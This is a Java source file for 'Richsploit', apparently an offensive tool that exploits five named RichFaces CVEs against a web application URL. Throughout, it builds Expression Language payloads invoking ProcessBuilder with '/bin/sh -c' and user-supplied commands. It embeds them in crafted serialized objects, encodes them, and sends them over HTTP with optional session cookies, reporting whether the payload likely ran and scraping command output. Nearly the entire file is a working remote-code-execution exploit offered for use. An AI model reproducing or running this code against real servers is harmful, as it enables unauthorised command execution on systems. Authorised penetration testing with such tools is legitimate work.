package com.redtimmy;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Modifier;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.zip.Deflater;

import com.sun.facelets.el.LegacyMethodBinding;
import org.ajax4jsf.resource.UserResource.UriData;
import org.ajax4jsf.util.base64.URL64Codec;
import org.apache.commons.cli.CommandLine;
import org.apache.commons.cli.CommandLineParser;
import org.apache.commons.cli.DefaultParser;
import org.apache.commons.cli.HelpFormatter;
import org.apache.commons.cli.Option;
import org.apache.commons.cli.Options;
import org.apache.commons.cli.ParseException;
import org.apache.el.MethodExpressionImpl;
import org.apache.el.ValueExpressionImpl;
import org.apache.el.lang.VariableMapperImpl;
import org.richfaces.resource.ResourceUtils;
import org.richfaces.resource.ResourceUtils;

import javax.el.MethodExpression;
import javax.el.ValueExpression;
import javax.faces.component.StateHolderSaver;
import javax.faces.el.MethodBinding;
import javax.faces.view.Location;
import javax.faces.view.facelets.FaceletContext;
import javax.faces.view.facelets.TagAttribute;

import org.jboss.weld.el.WeldMethodExpression;

import com.sun.faces.facelets.tag.TagAttributeImpl;
import com.sun.faces.facelets.el.TagMethodExpression;


public class Richsploit {

	private static boolean DEBUG = false;

	public static void main(String[] args) throws IOException, NoSuchFieldException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException {
		Options options = new Options();

        Option url = new Option("u", "url", true, "URL of richfaces application, i.e. http://example.com/app for RF4.x and http://example.com/app/a4j/g/3_3_3.Final for RF3.x");
        url.setRequired(true);
        options.addOption(url);

        Option version = new Option("v", "version", true, "Richfaces branch, either 3 or 4");
        version.setRequired(true);
        options.addOption(version);
        
        Option exploit = new Option("e", "exploit", true, "0: CVE-2013-2165\n 1: CVE-2015-0279\n2: CVE-2018-12532\n3: CVE-2018-12533 (experimental)\n4: CVE-2018-14667");
        exploit.setRequired(true);
        options.addOption(exploit);
        
        Option payload = new Option("p", "payload", true, "The file containing serialized object (CVE-2013-2165), or\nShell command to execute (all other CVE's), or\nExpression Language (with -x)\n\nuse multiple -p to run more than one command");
        payload.setRequired(true);
        options.addOption(payload);

		Option expression = new Option("x", "expression", false, "Use payload as an expression instead of a command (not valid for CVE-2013-2165)");
		expression.setRequired(false);
		options.addOption(expression);

		Option path = new Option("f", "filepath", true, "Substitute the exploited file path to an arbitrary file (CVE-2015-0279 and CVE-2018-12533)");
		path.setRequired(false);
		options.addOption(path);

		Option verbose = new Option("V", "verbose", false, "Verbose mode");
		verbose.setRequired(false);
		options.addOption(verbose);

		Option cookies = new Option("c", "cookies", true, "Add cookies to the request");
		cookies.setRequired(false);
		options.addOption(cookies);

		// add support to arbitrary SerializationUUID
		// regex response
		Option regex = new Option("r", "regex", true, "Use regex to display the first group of the payload response (e.g. <pre>(.*?)</pre>)");
		cookies.setRequired(false);
		options.addOption(regex);


        CommandLineParser parser = new DefaultParser();
        HelpFormatter formatter = new HelpFormatter();
        CommandLine cmd = null;

        try {
            cmd = parser.parse(options, args);
        } catch (ParseException e) {
            System.out.println(e.getMessage());
            formatter.printHelp("Richsploit", options);
            System.exit(1);
        }

        String inputUrl = cmd.getOptionValue("url");
        String inputVersion = cmd.getOptionValue("version");
        String inputExploit = cmd.getOptionValue("exploit");
        String[] inputPayload = cmd.getOptionValues("payload");
		String inputCookies = "";
		String inputRegex = "";

		boolean inputExpression = false;
		String inputPath = "";

		if (cmd.hasOption("expression")) {
			inputExpression = true;
		}

		if (cmd.hasOption("verbose")) {
			DEBUG = true;
		}

		if (cmd.hasOption("filepath")) {
			inputPath = cmd.getOptionValue("filepath");
		}
        
        if(!(inputVersion.equals("3") || inputVersion.contentEquals("4"))) {
        	printNegative("Version should be 3 or 4");
        	System.exit(1);
        }
        
        int exploit_nr = Integer.parseInt(inputExploit);
        if(exploit_nr < 0 || exploit_nr > 4) {
        	printNegative("Exploit should be 0, 1, 2, 3 or 4");
        }

		if (cmd.hasOption("cookies")) {
			inputCookies = cmd.getOptionValue("cookies");
		}

		if (cmd.hasOption("regex")) {
			inputRegex = cmd.getOptionValue("regex");
		}

        switch(exploit_nr) {
        case 0:
        	exploit0(inputUrl, inputVersion, inputPayload, inputPath, inputCookies, inputRegex);
        	break;
        case 1:
        	exploit1(inputUrl, inputVersion, inputPayload, inputExpression, inputPath, inputCookies, inputRegex);
        	break;
        case 2:
        	exploit2(inputUrl, inputVersion, inputPayload, inputExpression, inputPath, inputCookies, inputRegex);
        	break;
        case 3:
        	//printNegative("CVE-2018-12533 is currently not supported");
			exploit3(inputUrl, inputVersion, inputPayload, inputExpression, inputPath, inputCookies, inputRegex);
        	break;
        case 4:
        	exploit4(inputUrl, inputVersion, inputPayload, inputExpression, inputPath, inputCookies, inputRegex);
        	break;
        }

	}
	
	private static void exploit4(String inputUrl, String inputVersion, String[] inputPayload, boolean inputExpression, String inputPath, String inputCookies, String inputRegex) {
		if(!inputVersion.equals("3")) {
			printNegative("This exploit only works for Richfaces 3.x");
			System.exit(1);
		}
		
		printInfo("This exploit requires that you first visit a page containing the <a4j:mediaOutput> tag. This will register UserResource for the session");
		printInfo("After that, you can exploit the page by passing the session to Richsploit with the parameter -c");

		UriData ud = new UriData();

		String[] commandList = inputPayload;
		String el;
		int index = 1;

		if (inputPath == "") {
			//inputPath = "org.ajax4jsf.resource.UserResource/n/s/-1487394660/DATA/";
			inputPath = "org.ajax4jsf.resource.UserResource/n/n/DATA/";
		}

		for (String command : commandList) {

			if (commandList.length > 1) {
				printNegative("Encoding payload #" + (index++));
			}

			if (inputExpression) {
				el = command;
			} else {
				el = "#{\"\".getClass().forName(\"java.lang.ProcessBuilder\").getConstructors()[1]." +
						"newInstance(\"/bin/sh~-c~"+command+"\".split(\"~\")).start()}";
			}

			MethodExpression me = new MethodExpressionImpl(el, null, null, null, null, null);
			StateHolderSaver shs = new StateHolderSaver(null, me);

			try {
				Field f = getField(ud.getClass(), "createContent");
				f.set(ud, shs);
			} catch (Exception e) {
				e.printStackTrace();
			}

			Object objectToSerialize = ud;

			ByteArrayOutputStream dataStream = new ByteArrayOutputStream(1024);
			ObjectOutputStream objStream;

			try {
				objStream = new ObjectOutputStream(dataStream);
				objStream.writeObject(objectToSerialize);
				objStream.flush();
				objStream.close();
				dataStream.close();
				byte[] objectData = dataStream.toByteArray();
				byte[] dataArray = RichfacesDecoder.encrypt(objectData);
				String encoded_payload = new String(dataArray, "ISO-8859-1");


				StringBuilder url = new StringBuilder();
				url.append(inputUrl + inputPath);
				printInfo("Sending request to " + url.toString() + "...");
				url.append(encoded_payload + ".jsf");

				if (inputCookies == "") {
					printInfo("No session found. Copy the following URL in the browser to use the same session as you did when loading <a4j:mediaOutput>:");
					System.out.println(url.toString());
				} else {

					if(DEBUG) {
						printDebug("url: " + url.toString());
					}

					printInfo("Session used: " + inputCookies);
					send_request(url.toString(), inputCookies, inputRegex);
				}

			} catch (IOException e) {
				e.printStackTrace();
			}
		}
	}

	@SuppressWarnings("deprecation")
	private static void exploit3(String inputUrl, String inputVersion, String[] inputPayload, boolean inputExpression, String inputPath, String inputCookies, String inputRegex) throws NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchFieldException, IOException {
		// https://www.lucifaer.com/2018/12/05/RF-14310%EF%BC%88CVE-2018-12533%EF%BC%89%E5%88%86%E6%9E%90/

		if(!inputVersion.equals("3")) {
			printNegative("This exploit only works for Richfaces 3.x");
			System.exit(1);
		}

		String[] commandList = inputPayload;
		String el;
		int index = 1;

		if (inputPath == "") {
			inputPath = "org.richfaces.renderkit.html.Paint2DResource/DATA/";
		}

		for (String command : commandList) {

			if (commandList.length > 1) {
				printNegative("Encoding payload #" + (index++));
			}

			if (inputExpression) {
				el = command;
			} else {
				el = "#{\"\".getClass().forName(\"java.lang.ProcessBuilder\").getConstructors()[1]." +
						"newInstance(\"/bin/sh~-c~"+command+"\".split(\"~\")).start()}";
			}

			MethodExpression me = new MethodExpressionImpl(el, null, null, null, null, null);
			StateHolderSaver shs = createStateHolderSaver(me);

			Class clzz = null;
			try {
				clzz = Class.forName("org.richfaces.renderkit.html.Paint2DResource");
			} catch (ClassNotFoundException e) {
				throw new RuntimeException(e);
			}

			Class innerClazz[] = clzz.getDeclaredClasses();
			for (Class c: innerClazz) {
				int mod = c.getModifiers();
				String modifier = Modifier.toString(mod);
				if (modifier.contains("private")) {
					Constructor cc = c.getDeclaredConstructor();
					cc.setAccessible(true);
					Object imageData = cc.newInstance(null);

					//    设置ImageData_width
					Field _widthField = imageData.getClass().getDeclaredField("_width");
					_widthField.setAccessible(true);
					_widthField.set(imageData, 300);

					//    设置ImageData_height
					Field _heightField = imageData.getClass().getDeclaredField("_height");
					_heightField.setAccessible(true);
					_heightField.set(imageData, 120);

					//    设置ImageData_data
					Field _dataField = imageData.getClass().getDeclaredField("_data");
					_dataField.setAccessible(true);
					_dataField.set(imageData, null);

					//    设置ImageData_format
					Field _formatField = imageData.getClass().getDeclaredField("_format");
					_formatField.setAccessible(true);
					_formatField.set(imageData, 2);

					//    设置ImageData_paint
					Field _paintField = imageData.getClass().getDeclaredField("_paint");
					_paintField.setAccessible(true);
					_paintField.set(imageData, shs);

					//    设置ImageData_paint
					Field cacheableField = imageData.getClass().getDeclaredField("cacheable");
					cacheableField.setAccessible(true);
					cacheableField.set(imageData, false);

					//    设置ImageData_bgColor
					Field _bgColorField = imageData.getClass().getDeclaredField("_bgColor");
					_bgColorField.setAccessible(true);
					_bgColorField.set(imageData, 0);

					// 4. 打印最后的poc
					Object objectToSerialize = imageData;

					ByteArrayOutputStream dataStream = new ByteArrayOutputStream(1024);
					ObjectOutputStream objStream;

					try {
						objStream = new ObjectOutputStream(dataStream);
						objStream.writeObject(objectToSerialize);
						objStream.flush();
						objStream.close();
						dataStream.close();
						byte[] objectData = dataStream.toByteArray();
						byte[] dataArray = RichfacesDecoder.encrypt(objectData);
						String encoded_payload = new String(dataArray, "ISO-8859-1");


						StringBuilder url = new StringBuilder();
						url.append(inputUrl + inputPath);
						printInfo("Sending request to " + url.toString() + "...");
						url.append(encoded_payload + ".jsf");


						if(DEBUG) {
							printDebug("url: " + url.toString());
						}

						send_request(url.toString(), inputCookies, inputRegex);

					} catch (IOException e) {
						e.printStackTrace();
					}


				}
			}

//			String encoded_payload = ResourceUtils.encodeObjectData(imageData);
//			send_mor(inputUrl, encoded_payload, inputPath, inputCookies, inputRegex);
		}
	}


	@SuppressWarnings("deprecation")
	private static void exploit2(String inputUrl, String inputVersion, String[] inputPayload, boolean inputExpression, String inputPath, String inputCookies, String inputRegex) {
		if(!inputVersion.equals("4")) {
			printNegative("This exploit only works for Richfaces 4.x");
			System.exit(1);
		}

		String[] commandList = inputPayload;
		String el_one;
		int index = 1;

		for (String command : commandList) {

			if (commandList.length > 1) {
				printNegative("Encoding payload #" + (index++));
			}

			if (inputExpression) {
				el_one = command;
			} else {
				el_one = "#{\"\".getClass().forName(\"java.lang.ProcessBuilder\").getConstructors()[1].newInstance(\"/bin/sh~-c~" + command + "\".split(\"~\")).start()}";
			}
			String el_two = "#{dummy.toString}";

			if(DEBUG) {
				printDebug("Expression: " + el_one);
			}

			ValueExpression ve = new ValueExpressionImpl(el_one, null, null, null, null);
			VariableMapperImpl vmi = new VariableMapperImpl();
			vmi.setVariable("dummy", ve);
			MethodExpression me = new org.apache.el.MethodExpressionImpl(el_two, null, null, vmi, null, null);
			StateHolderSaver shs = createStateHolderSaver(me);

			Object[] dat = new Object[5];
			dat[0] = new Boolean(false);
			dat[1] = new String("image/jpeg");
			dat[2] = null;
			dat[3] = shs;
			dat[4] = null;

			String encoded_payload = ResourceUtils.encodeObjectData(dat);
			send_mor(inputUrl, encoded_payload, inputPath, inputCookies, inputRegex);
		}
	}

	@SuppressWarnings("deprecation")
	private static void exploit1(String inputUrl, String inputVersion, String[] inputPayload, boolean inputExpression, String inputPath, String inputCookies, String inputRegex) {
		if(!inputVersion.equals("4")) {
			printNegative("This exploit only works for Richfaces 4.x");
			System.exit(1);
		}

		String myEl = "";
		int index = 1;

		String[] commandList = inputPayload;

		for (String command : commandList) {

			if (commandList.length > 1) {
				printNegative("Encoding payload #" + (index++));
			}

			if (inputExpression) {
				myEl = command;
			} else {
				myEl = "#{\"\".getClass().forName(\"java.lang.ProcessBuilder\").getConstructors()[1]." +
						"newInstance(\"/bin/sh~-c~" + command + "\".split(\"~\")).start()}";
			}

			if (DEBUG) {
				printDebug("Expression: " + myEl);
			}

			MethodExpression me = new org.apache.el.MethodExpressionImpl(myEl, null, null, null, null, null);
			StateHolderSaver shs = createStateHolderSaver(me);

			Object[] dat = new Object[5];
			dat[0] = new Boolean(false);
			dat[1] = new String("image/jpeg");
			dat[2] = null;
			dat[3] = shs;
			dat[4] = null;

			String encoded_payload = ResourceUtils.encodeObjectData(dat);
			send_mor(inputUrl, encoded_payload, inputPath, inputCookies, inputRegex);
		}
	}

	private static void exploit0(String inputUrl, String inputVersion, String[] inputPayload, String inputPath, String inputCookies, String inputRegex) {
		int index = 1;

		for (String payload : inputPayload) {

			if (inputPayload.length > 1) {
				printNegative("Encoding payload #" + (index++));
			}

			String encoded_payload = RichfacesDecoder.encode(payload);

			switch(inputVersion) {
				case "3":
					StringBuilder url = new StringBuilder();
					url.append(inputUrl + "org.richfaces.renderkit.html.images.BevelSeparatorImage/DATA/");
					printInfo("Sending request to " + url.toString() + "...");
					url.append(encoded_payload + ".jsf");
					send_request(url.toString(), inputCookies, inputRegex);
					break;
				case "4":
					send_mor(inputUrl, encoded_payload, inputPath, inputCookies, inputRegex);
					break;
			}
		}
	}
	
	private static StateHolderSaver createStateHolderSaver(MethodExpression me) {
		WeldMethodExpression wme = new WeldMethodExpression(me);
	    Location loc = new Location("",0,0);
	    TagAttributeImpl tai = new TagAttributeImpl(loc, "", "", "", "");
	    TagMethodExpression tme = new TagMethodExpression(tai, wme);
	    StateHolderSaver shs = new StateHolderSaver(null, tme);
	    return shs;
	}
	
	private static Field getField(final Class<?> clazz, final String fieldName) throws Exception {
		Field field = clazz.getDeclaredField(fieldName);
		if (field != null)
			field.setAccessible(true);
		else if (clazz.getSuperclass() != null)
			field = getField(clazz.getSuperclass(), fieldName);
		return field;
	}
	

	private static void send_mor(String inputUrl, String encoded_payload, String inputPath, String inputCookies, String inputRegex) {
		StringBuilder url = new StringBuilder();

		String requestPath = "/rfRes/org.richfaces.resource.MediaOutputResource.jsf";

		// Remove trailing slash
		if(inputUrl.endsWith("/")) {
			inputUrl = inputUrl.substring(0, inputUrl.length()-1);
		}

		// change requestPath to a user supplied
		if (!inputPath.equals("")) {
			requestPath = inputPath;
		}

		url.append(inputUrl);
		url.append(requestPath);

		printInfo("Sending request to " + url.toString() + "...");
		url.append("?do=" + encoded_payload);
		
		send_request(url.toString(), inputCookies, inputRegex);
	}
	
	private static void send_request(String url, String inputCookies, String inputRegex) {
		if(DEBUG) {
			printDebug("url: " + url);
		}

		try {
			URL url_connection = new URL(url);
			HttpURLConnection http_url_connection = (HttpURLConnection) url_connection.openConnection();

			if (inputCookies != "") {
				http_url_connection.setRequestProperty("Cookie", inputCookies.toString());
			}

			//url_connection.openStream();
			http_url_connection.connect();

			Integer statusCode = http_url_connection.getResponseCode();

			if (statusCode == 200 || statusCode == 500) {
				printInfo("Server returned " + statusCode + ", payload might have been executed");
			} else if (statusCode == 404) {
				printInfo("Server returned 404, requested resource doesn't exists");
			} else {
				printInfo("Server returned " + statusCode + ", payload might not have been executed :(");
			}

			if (inputRegex != "") {
				BufferedReader br = null;
				if (100 <= http_url_connection.getResponseCode() && http_url_connection.getResponseCode() <= 399) {
					br = new BufferedReader(new InputStreamReader(http_url_connection.getInputStream()));
				} else {
					br = new BufferedReader(new InputStreamReader(http_url_connection.getErrorStream()));
				}

				String strCurrentLine = "";
				String pageContent = "";

				while ((strCurrentLine = br.readLine()) != null) {
					pageContent += strCurrentLine;
				}

				Pattern pattern = Pattern.compile(inputRegex, Pattern.UNICODE_CASE);
				Matcher matcher = pattern.matcher(pageContent);

				if (pageContent == "") {
					printNegative("Empty response");
				} else if (matcher.find()) {
					printNegative("Content: " + matcher.group(1));
				} else {
					printNegative("Empty response for this regex");
				}

			}

		} catch (IOException e) {
			if(e.getMessage().contains("Server returned HTTP response code: 500")) {
				printInfo("Server returned 500, payload might have been executed");
				return;
			} else {
				e.printStackTrace();
				System.exit(1);
			}
		}
	}

	private static void printInfo(String string) {
		System.out.println("[+] " + string);
	}

	private static void printNegative(String string) {
		System.out.println("[-] " + string);
	}

	private static void printDebug(String string) {
		System.out.println("[!] " + string);
	}
}
